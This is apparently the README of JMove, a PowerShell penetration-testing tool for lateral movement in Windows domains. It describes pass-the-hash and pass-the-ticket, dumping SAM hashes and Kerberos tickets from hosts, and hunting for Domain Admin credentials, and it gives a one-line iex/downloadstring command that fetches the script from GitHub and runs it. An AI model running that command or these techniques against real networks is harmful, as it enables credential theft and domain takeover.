# JMove
Lateral Movement within Windows environments

JMove is a PowerShell tool that is designed to aid in lateral movement within a Windows environment. 

This tool enables you to use new credentials, such as usernames and passwords or hashes or tickets, to perform pass-the-password, pass-the-hash, or pass-the-ticket actions. 

The tool can handle both domain or local credentials, providing a versatile solution for network penetration testing. 

Once the credential material is provided, JMove will

- Enumerate Active Directory (AD) for servers or workstations, or work with a provided list of hostnames

- Run a port 135 scan to check for alive hosts, and enumerate if you have local admin access to those hosts

- Enumerate AD Domain and Enterprise Admins

- Enumerate users sessions on those hosts where you have local admin access

- Check if any Domain or Enterprise Admin has a session on any of those hosts

- Dump SAM from those hosts

- Dump hashes and tickets from those hosts then save them into your current folder

- Check for the presence of Domain or Enterprise Admins tickets or hashes in the dumps

Run as follows:

`iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Leo4j/JMove/main/JMove.ps1')`

Credits:

Rubeus

@Credit to: https://github.com/GhostPack/Rubeus && https://github.com/gentilkiwi/kekeo/

Mimikatz

Benjamin DELPY gentilkiwi ( benjamin@gentilkiwi.com )

Invoke-SMBClient

Kevin-Robertson - https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBClient.ps1

Invoke-SMBExec

Kevin-Robertson - https://github.com/Kevin-Robertson/Invoke-TheHash/blob/master/Invoke-SMBExec.ps1

Import-ActiveDirectory

samratashok - https://raw.githubusercontent.com/samratashok/ADModule/master/Import-ActiveDirectory.ps1

SharpSecDump

G0ldenGunSec - https://github.com/G0ldenGunSec/SharpSecDump

Get-LoggedInUser

Paul Contreras - https://thesysadminchannel.com/get-logged-in-users-using-powershell/
